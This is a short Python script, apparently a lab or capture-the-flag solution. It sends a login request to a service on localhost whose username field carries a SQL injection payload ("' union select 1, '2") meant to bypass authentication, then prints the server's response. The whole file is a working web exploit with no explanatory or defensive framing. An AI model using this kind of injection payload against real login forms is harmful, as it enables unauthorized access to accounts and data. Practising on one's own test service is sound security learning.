import requests
if __name__ == "__main__":
    url = 'http://localhost:8888' 
    data = {
        'username' : "' union select 1, '2",
        'password' : "2"
    }
    res = requests.post(url=url, data=data, allow_redirects=False)
    print(res.text, res.status_code)
